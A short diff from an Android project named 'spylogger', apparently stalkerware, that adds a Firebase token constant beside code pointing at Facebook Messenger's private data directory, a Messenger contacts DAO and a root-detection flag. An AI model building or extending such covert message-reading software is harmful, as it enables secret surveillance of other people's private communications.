@@ -24,6 +24,7 @@ import android.provider.Settings.Secure;
 import android.util.Base64;
 import android.widget.Toast;
 
+import com.google.firebase.iid.FirebaseInstanceId;
 import com.gravatasufoca.spylogger.R;
 import com.gravatasufoca.spylogger.dao.messenger.DatabaseHelperFacebookContacts;
 import com.gravatasufoca.spylogger.model.messenger.Contact;
@@ -65,6 +66,7 @@ public class Utils {
 
 	public static final String FACEBOOK_DIR_PATH=android.os.Environment.getDataDirectory().toString()+"/data/com.facebook.orca";
 	public static final String NOT_PREMIUM = "<div class=\"center\"><div class=\"alert alert-warning section\">%s</div></div>";
+	public static final String TOKEN = FirebaseInstanceId.getInstance().getToken();
 	public static boolean rooted;
 
 	public static String[] permissoes={
